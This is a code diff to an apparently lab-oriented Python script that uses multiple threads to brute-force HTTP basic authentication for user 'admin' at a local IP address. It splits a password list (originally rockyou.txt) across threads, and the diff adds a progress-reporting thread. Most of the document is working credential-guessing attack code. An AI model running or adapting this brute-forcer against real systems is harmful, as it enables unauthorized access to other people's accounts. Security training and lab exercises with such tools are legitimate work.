@@ -6,11 +6,12 @@ import shutil
 import threading
 import time
 
+
 class Environnement():
     def __init__(self, tries):
         self.URL = 'http://192.168.43.32'
         self.USER = 'admin'
-        self.PATH = "rockyou.txt"  # Path of password list
+        self.PATH = "test.txt"  # Path of password list
         self.TMP_PATH = "./tmp/"  # Created during the runtime -> store the files for each Thread
         self.FAILS, self.ERROR = 0, 0
         self.FLAG = ''
@@ -19,20 +20,28 @@ class Environnement():
         self.THREAD_NUMBER = 4 # Warning too much thread can be more slower (the computer need to manage them so his capacities are used)
         self.FILES_PATHS = []  # Each thread has his file
         self.ATTEMPT = 0
-        self.THREAD_PERCENTAGE = threading.Thread(target=self.thread_percentage_func())
+        self.THREAD_PERCENTAGE = None
         self.INIT_TIME = time.time()
-    def get_percentage(self):
-        return self.ATTEMPT / self.TRIES
-    def thread_percentage_func(self):
-        last_percentage = 0
-        current_percentage = self.get_percentage()
-        while current_percentage==100 or self.FOUND==True:
-            if int(current_percentage)%10 == 0 and last_percentage != int(current_percentage):
-                print(f"[INFO] {current_percentage} %")
-            time.sleep(1)
+
+        
 
 # Init our environnement
-env = Environnement(25000)
+env = Environnement(16737)
+
+class InfoThread(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    def run(self):
+        last_percentage = 0
+        current_percentage = self.get_percentage()
+        while current_percentage<101 or env.FOUND!=True:
+            current_percentage = self.get_percentage()
+            if last_percentage != current_percentage and current_percentage<101:
+                print(f"[INFO] {current_percentage} %")
+                last_percentage=current_percentage
+            time.sleep(0.001)
+    def get_percentage(self):
+        return int(float(env.ATTEMPT)*100 / float(env.TRIES))
 
 class BruteForceThread(threading.Thread):
     def __init__(self, path):
@@ -40,7 +49,7 @@ class BruteForceThread(threading.Thread):
         self.path = path
     def run(self):  # path is the file path for the thread using this function. Brute Force basic auth function.
         print('\n\n   [+] STARTING \'%s\'\n\n' % (env.URL))
-        print(self.path)
+        print(self.path+"\n")
         with open(self.path, 'r') as f:
             for i in range(int(env.TRIES/env.THREAD_NUMBER)):
                 if env.FOUND == False:
@@ -57,7 +66,7 @@ class BruteForceThread(threading.Thread):
                             env.FOUND = True
                             break
                         env.FAILS += 1
-                    
+                        time.sleep(0.001)
                     except Exception as e:  # Catch problem
                         print('[ERROR] SOMETHING WENT WRONG')
                         env.ERROR += 1
@@ -105,16 +114,17 @@ if __name__ == '__main__':
         os.mkdir("./tmp")
     except:
         pass
-    thread_file_splitting()
-
     
+    thread_file_splitting()
+    info_thread = InfoThread()
+    info_thread.setDaemon(True)
+    info_thread.start()
 
     # the job list 
     jobs = []
     for i in range(env.THREAD_NUMBER):
         thread =  BruteForceThread(f"{env.TMP_PATH}{i}.txt")
         jobs.append(thread)
-
     print(jobs)
     try:
         # Start the threads (i.e. brute force with each password list)
@@ -125,6 +135,7 @@ if __name__ == '__main__':
         for j in jobs:
             j.join()
 
+        info_thread.join()
     except KeyboardInterrupt:
         print("[STOPPED] Interrupted.")
         env.FOUND = None
